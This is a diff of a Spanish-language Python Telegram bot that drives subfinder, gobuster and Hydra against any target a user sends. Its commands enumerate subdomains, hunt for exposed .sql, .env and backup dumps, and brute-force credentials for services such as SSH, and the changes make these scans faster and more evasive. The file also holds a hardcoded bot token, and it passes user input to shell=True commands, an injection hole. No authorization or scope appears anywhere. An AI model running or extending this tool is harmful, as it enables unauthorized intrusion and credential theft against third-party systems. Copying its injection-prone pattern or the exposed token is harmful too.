@@ -6,6 +6,7 @@ import time
 import threading
 import socket
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 # --- CONFIGURACIÓN ---
 TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
@@ -21,7 +22,6 @@ def preparar_wordlist():
     maestra_path = os.path.join(BASE_DIR, "maestra.txt")
     
     with open(maestra_path, "w") as out:
-        # Rutas base de alta probabilidad
         out.write("index\nlogin\nsignin\nadmin\nportal\nconfig\nsetup\napi\n.env\n.git\n.sql\nbackup\n")
         for f in archivos:
             p = os.path.join(BASE_DIR, f)
@@ -37,21 +37,21 @@ def ejecutar_hilo(func, message):
 def verificar_url(url):
     """Verifica si un subdominio responde y obtiene su IP evitando errores DNS"""
     try:
-        # Primero resolvemos el hostname para evitar errores críticos de conexión
         hostname = url.replace('http://', '').replace('https://', '').split('/')[0]
         ip = socket.gethostbyname(hostname)
         
         test_url = f"http://{url}" if not url.startswith(('http://', 'https://')) else url
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
         
         try:
-            response = requests.get(test_url, timeout=4, verify=False)
+            response = requests.get(test_url, timeout=3, verify=False, headers=headers)
             status = response.status_code
-            emoji = "✅" if status < 400 else "❌"
+            emoji = "✅" if status < 400 else "⚠️"
             return f"{emoji} {url} [{ip}] (Status: {status})"
         except:
-            return f"✅ {url} [{ip}] (DNS OK / Timeout Web)"
+            return f"✅ {url} [{ip}] (DNS OK / Web Timeout)"
     except:
-        return f"❌ {url} (Inalcanzable/DNS Fail)"
+        return f"❌ {url} (DNS Fail)"
 
 def enviar_doc(chat_id, ruta, titulo):
     for _ in range(20):
@@ -98,10 +98,9 @@ def do_dir(message):
     path = os.path.join(BASE_DIR, f"dir_{int(time.time())}.txt")
     wordlist = preparar_wordlist()
     bot.send_message(message.chat.id, "🚀 Escaneando directorios (Modo Seguro Termux)...")
-    # Se agrega -b 301,302,404 y --wildcard para evitar los errores vistos en consola
     cmd = (
         f"gobuster dir -u {url} -w {wordlist} -x php,html,txt,sql,env,bak,zip,log -o {path} -k "
-        f"-b 301,302,404 --wildcard --no-error "
+        f"-b 301,302,404 --wildcard --no-error -t 20 "
         f"-a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'"
     )
     subprocess.run(cmd, shell=True)
@@ -121,11 +120,19 @@ def do_subs(message):
     subprocess.run(f"subfinder -d {dom} -o {path_raw} -silent", shell=True)
     
     if os.path.exists(path_raw):
-        with open(path_raw, "r") as f, open(path_final, "w") as out:
+        with open(path_raw, "r") as f:
             subdominios = f.read().splitlines()
-            for sub in subdominios:
-                resultado = verificar_url(sub)
-                out.write(resultado + "\n")
+        
+        bot.send_message(message.chat.id, f"⚡ Validando {len(subdominios)} subdominios en paralelo...")
+        
+        # Validación concurrente para máxima velocidad en Termux
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            resultados = list(executor.map(verificar_url, subdominios))
+        
+        with open(path_final, "w") as out:
+            for r in resultados:
+                out.write(r + "\n")
+        
         os.remove(path_raw)
         enviar_doc(message.chat.id, path_final, f"📡 Subdominios Validados: `{dom}`")
     else:
@@ -133,8 +140,8 @@ def do_subs(message):
 
 @bot.message_handler(commands=['fuerza'])
 def cmd_fuerza(message):
-    bot.send_message(message.chat.id, "⚡ **Formato: `IP Servicio`** (ej: 1.1.1.1 ssh)")
-    bot.register_next_step_handler(message, lambda m: ejecutar_hilo(do_fuerza, m))
+    msg = bot.send_message(message.chat.id, "⚡ **Formato: `IP Servicio`** (ej: 1.1.1.1 ssh)")
+    bot.register_next_step_handler(msg, lambda m: ejecutar_hilo(do_fuerza, m))
 
 def do_fuerza(message):
     try:
@@ -143,7 +150,6 @@ def do_fuerza(message):
         path = os.path.join(BASE_DIR, f"hydra_{int(time.time())}.txt")
         wordlist = preparar_wordlist()
         bot.send_message(message.chat.id, f"⚡ Atacando {service} en {target} con Hydra...")
-        # L y P usan maestra.txt. Se añade -f para terminar al hallar una clave.
         cmd = f"hydra -L {wordlist} -P {wordlist} {target} {service} -o {path} -t 4 -f"
         subprocess.run(cmd, shell=True)
         enviar_doc(message.chat.id, path, f"⚡ Reporte Fuerza Bruta: `{target}`")
@@ -173,7 +179,7 @@ def do_db(message):
     path = os.path.join(BASE_DIR, f"db_{int(time.time())}.txt")
     wordlist = preparar_wordlist()
     bot.send_message(message.chat.id, "🔍 Buscando .sql, .db, dumps y backups...")
-    cmd = f"gobuster dir -u {url} -w {wordlist} -x sql,db,sqlite,tar.gz,zip,bak -o {path} -k --no-error"
+    cmd = f"gobuster dir -u {url} -w {wordlist} -x sql,db,sqlite,tar.gz,zip,bak -o {path} -k --no-error -t 20"
     subprocess.run(cmd, shell=True)
     enviar_doc(message.chat.id, path, f"🗄️ Bases de datos encontradas en `{url}`")
 
